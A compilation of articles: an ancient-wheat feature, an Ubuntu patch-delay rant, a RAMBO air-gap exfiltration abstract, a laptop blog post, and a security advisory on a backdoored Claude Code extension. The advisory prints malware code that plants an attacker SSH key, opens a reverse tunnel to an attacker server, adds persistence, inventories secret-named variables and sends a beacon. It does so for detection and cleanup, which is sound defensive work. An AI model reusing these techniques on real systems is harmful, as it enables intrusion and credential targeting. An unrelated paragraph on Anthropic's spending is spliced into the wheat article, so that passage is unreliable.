title: An Italian farmer found some unknown seeds in his attic and planted them
body_text: An Italian Farmer Found Some Unknown Seeds in His Attic and, With Nothing to Lose, Planted Them. The Result Was Almost Biblical Skip to main content Search Shop Newsletters Renew Give a Gift Subscribe Membership i Subscribe Give a Gift Renew Sections Smart News History Science Innovation Arts & Culture Travel At the Smithsonian More from Smithsonian magazine Newsletters Photo Contest Podcast Videos Our Partners Smithsonian Store Smithsonian Journeys Subscribe to Smithsonian magazine and get a FREE tote. An Italian Farmer Found Some Unknown Seeds in His Attic and, With Nothing to Lose, Planted Them. The Result Was Almost Biblical When a seven-eared stem emerged from the ground, it seemed like a miracle. What Claudio Grossi had unearthed was an ancient grain that proved to be an answer to some modern problems Lina Zeldovich Photographs by Clara Vannucci November 2026 Share Copy link Email SMS Facebook X Reddit LinkedIn Bluesky Print Add as preferred source At his farm near Parma, Italy, Claudio Grossi offers a visual history of his miracle grain in photos, crackers and loaves. Clara Vannucci Sometime in the early 1990s, Claudio Grossi, a 40-year-old farmer in Parma, in northern Italy, was cleaning his attic when he turned up an old sack full of seeds that he couldn’t identify. The bag, he was sure, had been left by his late great-grandfather, who’d started the farmstead around 1915. Grossi had no idea how long the seeds had been sitting there, deprived of water, soil and sun. Dry and cracked, the kernels looked so old in the palm of his hand that he doubted anything would ever sprout from them. He carried the bag down the stairs, shook the seeds out into a pile of manure and then forgot about them. To his surprise, the seeds soon sprouted a few different types of wheat. One was particularly striking: At six feet high, its plants were about twice as tall as commercial wheat. But the most remarkable feature came when it developed ears—the grain-studded parts at the top of the plant. All of the wheat types Grossi had previously seen grew only one such ear. But the tall wheat grew a full seven ears, always in the same pattern: a long one with six shorties bunched up around it like little fingers. Even the kernels themselves were bigger than those of average wheat. And unlike the typical pale-yellow wheat kernels, they came in a rainbow of colors—yellow, black, red, white and even green, sometimes all on the same stem. Grossi, a grain farmer his whole life, had never seen anything like it. “I thought it was a freak of nature,” he says. He couldn’t find a mention of it in agricultural books. Ears grown from the very first seeds Grossi discovered in his attic. Grossi prizes these first grains, now preserved under glass in his kitchen. Clara Vannucci Subscribe to Smithsonian magazine now for just $19.99 This article is a selection from the November 2026 issue of Smithsonian magazine Subscribe For Grossi, a practicing Catholic, the next insight came from a different book altogether. Leafing through a Bible at church one Sunday, he found a passage in the Book of Genesis describing a stalk with seven ears, in a dream that Joseph interprets for the Pharaoh: “And he slept and dreamed the second time: And, behold, seven ears of grain came up upon one stalk, rank and good. And, behold, seven thin ears and blasted with the east wind sprung up after them. And the seven thin ears devoured the seven rank and full ears.” To Grossi, that sounded just like the mysterious crop in his manure pile. “I connected the dots,” Grossi says. That grain must be really ancient , he thought. And if people were farming this odd-looking wheat in biblical times, why does no one today? Back on his farm, Grossi harvested the grain, milled it into flour and baked a loaf of bread in his kitchen. Compared with commercial wheat, the dough didn’t rise well, but as the loaf sat in the oven, it filled the kitchen with a surprisingly nutty and delicious aroma. Once finished, it had a rich, satisfying taste. “You get these notes of sweetness that you can’t find in regular commercial flour,” he says. Did you know? More miracles of grain in the Bible In 2 Kings 4:42-44 , Elisha multiplies 20 barley loaves in order to feed 100 men—anticipating Jesus’s “Feeding of the 5,000” in the gospels.  In 1 Kings 17:8-16 , Elisha helps a widow at Zarephath to outlast a drought and famine with only a handful of flour and a little oil.  In Judges 7:9-15 , a Midianite soldier recounts a dream in which a barley loaf tumbles into the camp and overturns a tent. Gideon, the judge and military leader, recognizes the dream as a sign that God will deliver the Midianites into Israel's hands.  In 2 Kings 4:38-41 , during a famine, someone gathers wild gourds and cuts them into a pot of stew. The diners discover that the stew is dangerous and cry out to Elisha. He calls for flour and throws it into the pot—and the stew becomes miraculously safe to eat.  Grossi holds sheaves of his grain, cultivated on the same farm his great-grandfather tilled starting around 1915.  Clara Vannucci Grossi discovered it had other advantages: It was hardier and more self-sufficient than commercial varieties. It fared better during droughts, growing so tall that it overshadowed the weeds. It didn’t need fertilizer or herbicides. Indeed, it seemed so superior to its industrial cousins that he thought of it no longer as a freak of nature but as a wonder. He dubbed it grano del miracolo —“miracle grain” or “miracle wheat.” Grossi’s discovery came at just the right time. In Italy in the 1990s, a burgeoning slow-food movement aimed to preserve traditional farming practices and promote natural diets. Grossi hoped that miracolo could ride this slow-food wave, becoming both a portal to the past and a passage to a future. Perhaps, he thought, miracolo could help other farmers bring back ancient grains, leading the movement that is changing how we make bread, a staple of the human diet. And today, as climate change makes droughts, heat waves and plant disease outbreaks more frequent and intense, a grain that has shown it can fend for itself would help keep that bread on the table. Farmers began cultivating wheat about 10,000 years ago, in the Fertile Crescent —the area of the Middle East known as the Cradle of Civilization. Thousands of years ago, the hardy and adaptable plant took hold in Europe and Asia. Compared with our modern crops, these ancient wheats were much taller, outperforming other grasses in the field. Over the millennia, humans bred different varieties of wheat, some yielding less grain and others more. As human populations grew, the strains of wheat that brought plentiful harvests became more desirable. That pattern accelerated amid the upheavals of the early 20th century. By the early 1920s, Italy was still recovering from World War I and unable to grow enough grain to sustain itself; the country was importing roughly a third of its wheat. When fascist leader Benito Mussolini became prime minister in 1922, he launched a campaign to “free the Italian people from the slavery of foreign bread,” by pushing for wheat varieties that yielded greater harvests. The Italian government promoted and planted these “elite” varieties, then distributed the seeds to farmers. Named la Battaglia del Grano , or the Battle of Wheat, this campaign became a global model for agrarian development. In the United States, wheat harvests were then still plentiful, but not for long: By the early 1930s, amid unprecedented droughts, American farmers found the land was exhausted. The result was the Dust Bowl , during which the previously fertile soils of the Great Plains turned into a desert. American farmers had to look for more drought-resistant varieties that still yielded enough grain. The midcentury Green Revolution, a movement launched by the American agronomist Norman Borlaug , focused on selective breeding and boosted crop production. This work spread worldwide, feeding countless people. The wheat that was created was indeed more plentiful, yet it came with trade-offs. The petite plants couldn’t always outcompete weeds and were susceptible to disease, so growers used weed killers, fungicides and fertilizer to sustain the crops. Little did they know that these practices would only weaken the health of the soil—while making the wheat even less resilient to changing climate and extreme weather events. In the 1990s, Grossi sensed that anxiety over wheat harvests was building. That’s why, after he grew wheat from those seeds in the attic, he set out to put the hardy ancient grain back on the table. First, he realized he’d have to solve a big problem: Bread made from the wheat leavened poorly, rising only to fall again. In the early 2000s, he began discussing this challenge with an old local baker who shunned modern machines and still kneaded his dough by hand. The baker was intrigued. The two men started experimenting. They tried letting the dough rise in smaller batches, using wicker baskets that were taller and helped the dough keep its shape. Soon, the two found another secret: Less kneading made miracolo leaven even better. “The dough was rising, and it was holding its shape,” Grossi says. One new fan of the bread was Beniamino Perobelli , a student in food science at the University of Parma, who tasted the miracolo bread at a local farmers market and dedicated his undergraduate thesis to investigating its nutritional value. That work bore out what Grossi had already intuited: This wheat was truly ancient—and truly special. Working with the lab of Teofilo Vamerali , then a professor at the University of Parma, Perobelli determined that the grain was Triticum turgidum —literally “swollen wheat” in Latin. Known in English as “poulard wheat,” it had originally evolved in what today are Turkey, Egypt and other nearby Mediterranean countries. And searching agricultural references, Perobelli found that it had been grown in Italy, too, until farmers shifted toward higher-yield commercial varieties. That solved the mystery of the seed bag stashed away in the attic: It had survived because Grossi’s grandfather saved some of the heritage grains. The food scientists found that, compared with modern wheats, grano del miracolo was richer in phosphorus and iron. Moreover, to their surprise, they found that T. turgidum had less gluten than modern wheat. And it packed a lot of lysine and tryptophan, the essential amino acids that serve as proteins’ building blocks. It also had more arginine, an amino acid that children need to grow. “The richness of microelements, minerals, and the greater presence of proteins other than gluten were very pleasant surprises,” says Perobelli, now a corporate social responsibility and sustainability manager with Rigoni di Asiago , an Italian company that produces organic fruit spreads, honey and more. Grossi displays a bag of barley coffee, made with heirloom plants grown on his farm. This  barley is known as “Leonessa,” or “lioness.”  Clara Vannucci For Grossi, Perobelli’s findings offered scientific proof of his grain’s goodness. He persuaded Molino Grassi , a local organic grain company, to offer the flour to artisanal bakers. Over the next few years, Grossi upped production, so Molino Grassi could sell the flour to restaurants and consumers in Italy and abroad. By the 2010s, traditional recipes were enjoying a renaissance. So were artisanal bakers and pasta makers, who also became more discerning about which grains they used, says Francesco Sottile , an expert in biodiversity of agrosystems at the University of Palermo. Ancient grains aren’t necessarily perfect. For example, Grossi has found that miracolo’s height can be a liability—which may be why it fell out of favor with Mussolini. Heavy winds, rains and hail can make the tall stems flip over before the grain ripens, ruining harvests. But Grossi circumvented the problem by planting miracolo with shorter wheat varieties that provide structural support. “I’m quite happy because I developed something that’s like a discovery,” he says. Relying on a limited number of wheat cultivars, Sottile argues, leaves humanity vulnerable to agricultural disasters: prolonged droughts, extreme heat, new diseases or pests that develop resistance to our chemicals. Diversifying grains reduces the risk—even if some varieties succumb to environmental pressures, others will stand. Sottile shared an example. “I’m based in Sicily,” he says, where 2024 saw “one of the worst droughts in the last 35 to 40 years.” It was so bad that many commercial wheat growers abandoned their fields in April of that year, realizing they wouldn’t be able to reap the seeds they sowed. Sottile was heartened to see a better fate among smaller-batch farmers who grew heritage grains, more resilient to extreme weather. “Most of the farmers who were adopting ancient grains, they were able to collect, to harvest,” Sottile says. The world needs more crop biodiversity, he adds—including more ancient grains like grano del miracolo. By the same token, we need more people like Grossi, who, much like the ancient grain he sows, have the tenacity to make a miracle happen. Stories of gods and grains “Miracle wheat” is hardly the first divine cereal. Across millennia, gods have taught mortals how to earn their bread By Sonja Anderson Louvre Museum / Public Domain Greece: While Dionysus provided grapes and Athena was responsible for olives, the goddess Demeter brought grain to the Greeks. In myth, the latter goddess taught farming to a man named Triptolemus (pictured at right), then sent him out on a winged chariot to deliver the knowledge to all of Greece—an episode immortalized on ancient vases. Mesopotamia: Ancient Sumerians of the Fertile Crescent attributed farming to Ashnan, the grain goddess, “whose face is honey-covered / The lady, the procreatress, the vigor of the land,” per an ancient Sumerian poem. In myth, Ashnan and her sibling Lahar, deity of livestock, once drunkenly debated whether grains or sheep were more important. Enlil and Enki, the paramount Sumerian gods, declared Ashnan the winner, saying that without grain—often fed to herds—there could be no sheep. Egypt: Osiris ruled over death and the afterlife but was also a god of fertility, and it was said he taught mankind to cultivate wheat. Ancient Egyptians became famously adept at managing this crop: Their growing seasons regularly produced surpluses, thanks to the Nile’s floods. Some priests honored Osiris by planting grain in earthenware shaped like the god. China: Some ancient Chinese myths trace the country’s agriculture back to one emperor of legend: Shennong , born of a princess and a dragon some 4,000 years ago. The ruler supposedly had a bull’s head and a man’s body and is known as the divine farmer, or emperor of five grains (including rice, millets and wheat). He taught his people how to till their land, expanding the ancient Chinese diet—consisting mainly of meat, clams and wild fruits—to include grains and vegetables. Mexico: Quetzalcoatl was a deity of the Aztec civilization who, according to myth, created the humans of our current era—the Fifth Sun—and their world. He taught people how to carve rocks, dye cotton, read the stars and—most important—grow food. One day, Quetzalcoatl observed a black ant carrying a kernel of corn, turned himself into an ant and followed the insect through a crack in a stone mountain, where he found a trove of maize, beans, peppers and sage. He took a corn kernel, brought it to man and taught him how to plant it. Here's a remarkable milestone in the AI revolution: Anthropic now spends more on internal AI usage than it does paying employees. The company revealed this in its IPO filing . In April, the value of Claude AI used internally, calculated at prices Anthropic charges customers, exceeded its monthly employee compensation costs, excluding stock awards. By September, that internal AI usage had surged more than 250-fold since January. There's an important distinction here. Anthropic isn't actually spending more cash on AI than salaries. It's valuing its internal AI consumption at retail prices. Still, this feels like a watershed moment for the tech industry. In March, I wrote about a new trend : Tech companies are starting to treat AI tokens (the main way to measure usage) as a fourth component of employee compensation, alongside salary, bonuses, and stock awards. Anthropic's numbers show why. More than 90% of the code added to its software in September was written by Claude. Meanwhile, revenue has grown vastly faster than headcount. title: WTF Ubuntu?
body_text: WTF Ubuntu? WTF Ubuntu? 2026-11-02 What the fuck, Ubuntu? In case you missed it: CVE-2026-98432 is a critical (CVSS 9.8) bug in the Linux kernel's TCP code. It's been there since 2016, so virtually every Linux server on the planet has it, and it can be hit remotely. Anthropic says it built a working exploit that gets root on a server. A total takeover. Debian patched it on October 16 . Ubuntu still doesn't have a patch more than two weeks later. Every supported release, LTS included, is listed as "Vulnerable". Ubuntu's website promises "timely patches for critical vulnerabilities." Ubuntu hasn't shipped the patch nine days after it was rated 9.8 and six days after a working root exploit. Very fucking timely indeed. Software is full of this blabber where words mean nothing. Ubuntu uses words like these: "Timely." "Enterprise-grade." "Production grade." "Enterprise resilience. Developer velocity. Build with confidence on Ubuntu." Somebody, or perhaps worse, some special team at Canonical is dedicated to writing these........ So I'm asking again... What the fuck, Ubuntu? I'm moving all my servers off Ubuntu. I've completely lost trust in it. On the desktop I always hated it anyway. On servers I mostly used it because it's the default on most VPS providers, and I considered it the solid, no-drama LTS distro. Fuck that now. I can't express how crazy this is. I didn't have time to migrate my services and data when I learned about this, so I had to take all my servers that run Ubuntu offline. Oh and btw, distros run by volunteers (Debian, Arch, Alpine...) hve shipped the fix. Meanwhile Ubuntu, made by a company that sells security subscriptions, hasn't. This is true as of 2026-11-02 14:48 UTC. Added after this blew up: Can't beat all the bullshit, so I parody it at Bloatberg . ← Posts

title: Leaking Secrets from Air-Gap Computers by Spelling Radio Signals from RAM (2024)
body_text: [2409.02292] RAMBO: Leaking Secrets from Air-Gap Computers by Spelling Covert Radio Signals from Computer RAM Skip to main content Search Submit Donate Log in Search arXiv Press Enter to search · Advanced search --> Computer Science > Cryptography and Security arXiv:2409.02292 (cs) [Submitted on 3 Sep 2024] Title: RAMBO: Leaking Secrets from Air-Gap Computers by Spelling Covert Radio Signals from Computer RAM Authors: Mordechai Guri View a PDF of the paper titled RAMBO: Leaking Secrets from Air-Gap Computers by Spelling Covert Radio Signals from Computer RAM, by Mordechai Guri View PDF HTML (experimental) Abstract: Air-gapped systems are physically separated from external networks, including the Internet. This isolation is achieved by keeping the air-gap computers disconnected from wired or wireless networks, preventing direct or remote communication with other devices or networks. Air-gap measures may be used in sensitive environments where security and isolation are critical to prevent private and confidential information leakage. In this paper, we present an attack allowing adversaries to leak information from air-gapped computers. We show that malware on a compromised computer can generate radio signals from memory buses (RAM). Using software-generated radio signals, malware can encode sensitive information such as files, images, keylogging, biometric information, and encryption keys. With software-defined radio (SDR) hardware, and a simple off-the-shelf antenna, an attacker can intercept transmitted raw radio signals from a distance. The signals can then be decoded and translated back into binary information. We discuss the design and implementation and present related work and evaluation results. This paper presents fast modification methods to leak data from air-gapped computers at 1000 bits per second. Finally, we propose countermeasures to mitigate this out-of-band air-gap threat. title: My Favourite Laptop
body_text: My favourite laptop Posts Tags RSS Feed What I'm reading Codeberg GitHub Mastodon YouTube E-Mail My favourite laptop 30 Oct 2026 | programming I’m not a big owner of things, but the best laptop I’ve ever owned is a roughed-up 2015 Thinkpad X250. For the flex, here it is running a GUI shell sat on top of the microkernel I’m currently working on (blog post about this incoming… eventually). Here’s a list of things that I think make it brilliant. I don’t want to pretend that any of these things are uniquely exemplary: far from it. It is the confluence of them, and not any one in particular, that makes me love using it. Size It’s pretty tiny. Its form-factor fits snuggly into the footprint of an A4 piece of paper, so it sits alongside books and folders when placed in a small rucksack without risking damage. It weighs almost nothing too: even with the extra capacity battery, it’s only about 1.45 Kg. Light enough that you almost don’t notice it when travelling. Performance Mine has an i5-5200U: 4 logical cores, maxing out at 2.7 GHz. I upgraded it to 8 GB of RAM a while back: more than enough for some light on-the-go programming. Even at full pelt, I’ve never heard the fan kicking up much of a fuss. Now that I think about it, I’m not even certain that it works. Battery The X250 has both an internal battery and an external battery slot. I’ve opted for the largest after-market external battery I could find. When doing casual work the laptop will easily survive for north of 10 hours without a charge, stretching to 12 hours if I’m careful. Repairability The X250 was quite popular and replacement parts retail very cheaply on ebay. It’s not the easiest to disassemble Thinkpad by any means but I can tear it apart entirely with the pocket phillips I keep on my keyring. I have previously replaced: The internal battery The lid camera The keyboard The motherboard Every time you open up a laptop you run the risk of damaging something important either via a slip of the hand or simply the accumulated toll of loosening and tightening dozens of tiny screw threads. Despite that, my X250 has proved remarkably resilient and has never sustained any major damage despite more than more than a dozen tear-downs. Keyboard As with most Thinkpads, the keyboard feels lovely to use. When you spend a lot of time writing code the reliability and sensitivity of a keyboard starts to matter a lot. Coupled with my text editor , the experience of writing code on the thing is beautifully snappy. Operating System I opted for Endeavour OS. In the usual Arch Linux tradition, it favours native package installs over sandboxed applications. As a result my install sits at around 30 GB. A 128 GB M.2 SSD raided from another second-hand machine is more than enough to cover that and everything I’m working on. I’ve slimmed down my systemd setup as much as possible and the thing boots from cold in about 8 seconds. Cost Here’s where the X250 beats out most competition. I bought mine second-hand for about £100 in 2018. They’ve only got cheaper since then. I’m not afraid to take it anywhere because it’s barely worth stealing and would be cheap to replace even if that were to happen. Its value is very much not in its on-paper specs and instead in how I use it. Conclusion I get a certain glee in keeping older or second-hand hardware running as a daily driver. It sounds silly, but it feels like a quiet revolt against bigger-faster-costlier consumption culture. Come the end times, this is the machine I’ll be riding it out with. title: Backdoor in Claude Code for VS Code extension on the Cursor Marketplace
body_text: Official Claude Code Extension Compromise: Security Advisory | Phorion 🎉 Phorion ranked #1 in independent EDR telemetry evaluations. Learn more Features Detecting Threats Behavioral detection and threat hunting Protecting Endpoints File access controls and hash blocking Responding to Incidents Live response and device isolation Endpoint Visibility Deep telemetry via Apple's ESF Pricing About Us Blog Book a Demo October 30, 2026 Updated October 31, 2026 By Calum Hall Official Claude Code Extension Compromise: Security Advisory SSH Backdoor Cursor Marketplace VS Code macOS Linux Windows Threat Report TL;DR Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence. Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered. Revision history Initial publication 30 Oct, 05:30 UTC Marketplace correction 30 Oct, 09:13 UTC Corrected the affected marketplace to Cursor. Version-scope update 31 Oct, 00:43 UTC Added 2.1.312 per Cursor’s updated notice . Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313 , from its marketplace. While the implant includes setup and persistence logic for macOS, Linux, and Windows , we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way. The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded. Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off . Because the script only tries to enable SSH if the output matches Off , it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped. In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator. Infection Chain The Cursor Marketplace Extension The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code. The injected prefix pulls in standard Node.js modules ( child_process , fs , os , path , http , and crypto ) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire. Stage 1 - Preparing SSH Access First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys , setting permissions to 0700 on the directory and 0600 on the file. The key uses the comment svc-telemetry . Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string. var sd = path.join(HOME, ".ssh" ), ak = path.join(sd, "authorized_keys" ); // ... if (cur.indexOf( "svc-telemetry" ) < 0 ) { fs.appendFileSync(ak, PUB + "\n" ); d.sshKey = "added" } else { d.sshKey = "present" } Here, cur holds the existing contents of authorized_keys , and PUB is the embedded attacker public key (redacted here). With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening: Linux: tries to enable and start sshd or ssh via systemctl , falling back to service and /etc/init.d/ . macOS: checks Remote Login and, if it reports Off , tries to enable it via sudo -n systemsetup -setremotelogin on . Windows: tries to install and start OpenSSH Server using PowerShell. None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context. It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function ( det() ) that hardcodes /bin/sh , which isn’t going to get very far on a standard Windows install. A bug in the macOS SSH logic? On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i . It only tries to enable Remote Login if the output contains Off : // ... else if (PLAT === "darwin" ) { var rl = ex( "systemsetup -getremotelogin 2>/dev/null" , 4000 ); d.remoteLogin = rl; if ( /Off/i .test(rl)) { det( "sudo -n systemsetup -setremotelogin on >/dev/null 2>&1" ); d.remoteLoginOn = "tried" } } Notice that the second command ( -setremotelogin on ) uses sudo -n , while the first command ( -getremotelogin ) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead: You need administrator access to run this tool... exiting! systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0 . The malware’s ex() helper grabs stdout and returns it: function ex(c, t) { try { return cp.execSync(c, { timeout : t || 3000 , stdio : [ "ignore" , "pipe" , "ignore" ], windowsHide : true }).toString().trim() } catch (e) { return "" } } Because the output is "You need administrator access to run this tool... exiting!" , /Off/i.test(rl) evaluates to false . As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on . It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user. This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost. Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting. Stage 2 - Establishing the Reverse SSH Tunnel Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun . It’s worth keeping the two keys straight during an investigation: The public key added to ~/.ssh/authorized_keys ( svc-telemetry ) lets the attacker log into the victim’s machine. The embedded private key ( svc-telemetry-tun ) lets the victim’s machine connect out to the attacker’s tunnel server. The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_ , followed by the first ten characters of the MD5 hash of the hostname and home directory path: var kf = path.join( TMP, ".stk_" + crypto.createHash( "md5" ) .update( String (os.hostname()) + HOME).digest( "hex" ).slice( 0 , 10 ) ); // ... var RF = (PLAT === "win32" ) ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'" ; The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine: Affected host -- outbound SSH tunnel --> External SSH server Operator -- separate connection --> Server's allocated port | Through the existing tunnel | v Affected host's SSH:22 | Login using the planted key Because the tunnel runs with -N , it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself. The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds ( ServerAliveCountMax=3 ), and ExitOnForwardFailure is turned on. If autossh is installed, the script uses it; otherwise it falls back to standard ssh . It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE. Stage 3 - Keeping Access Available To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel: Platform Artifacts Persistence mechanism Notes Linux ~/.config/.smt , ~/.config/.smtk Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below). macOS ~/.config/.smt , ~/.config/.smtk , ~/Library/LaunchAgents/com.apple.sysmond.plist Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true , then loads it via launchctl . Runs in the user context rather than as a root LaunchDaemon. Windows ~/.config/smt.cmd , ~/.config/smtk , %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login. On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop. On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/ : <key> Label </key> <string> com.apple.sysmond </string> <!-- ... --> <key> RunAtLoad </key> <true/> <key> KeepAlive </key> <true/> Stage 4 - Host Recon Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server: Hostname, username, OS platform, and architecture Home directory, current working directory, and global Git email ( git config --global user.email ) Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran) Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i The environment variable check uses Object.keys(process.env) : Object .keys(process.env) .filter( function (k) { return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i .test(k) }) .slice( 0 , 40 ) Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise. To get the machine’s public IP, the script queries ifconfig[.]me , falling back to api[.]ipify[.]org . It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099 : var r = http.request({ host : h, port : p, path : "/beacon" , method : "POST" , timeout : 3000 , headers : { "content-type" : "application/json" } }, function (res) { res.resume() }); // ... r.write(JSON.stringify(d)); r.end() Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port. The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume() . It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access. Detection Opportunities From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry. SSH Key and Configuration Changes Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync , process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes ( Code Helper , Cursor Helper , etc.) creating or writing to ~/.ssh/authorized_keys . Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background. While you should also monitor for systemsetup -setremotelogin on , don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all. User LaunchAgent Persistence The persistence setup on macOS gives us a couple of strong signals: A non-Apple process writing a plist with a com.apple.* label ( ~/Library/LaunchAgents/com.apple.sysmond.plist ). A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory ( ~/.config/.smt ). Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together. SSH Tunnels and Follow-On Access On the process and network side, look for: ssh or autossh launched with remote port forwarding ( -R *:0:localhost:22 ) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk . Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099 ). If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost ( 127.0.0.1 or ::1 ) authenticating with the svc-telemetry key. Remediation If you identify an affected machine, uninstalling the extension alone won’t remove the backdoor . Make sure your response covers all of the stages it drops: Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225 . Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk . Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys , delete /tmp/.stk_* , and verify that Remote Login (SSH) hasn’t been enabled unexpectedly. Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter). Phorion’s Approach Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating com.apple.* LaunchAgents and LaunchAgents executing shell scripts from hidden directories. Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying ~/.ssh/authorized_keys directly, and Phorion Protections can be used to lock down ~/.ssh/ so that only authorised processes can read or modify SSH keys and configuration files in the first place. title: It's the memory latency, stupid
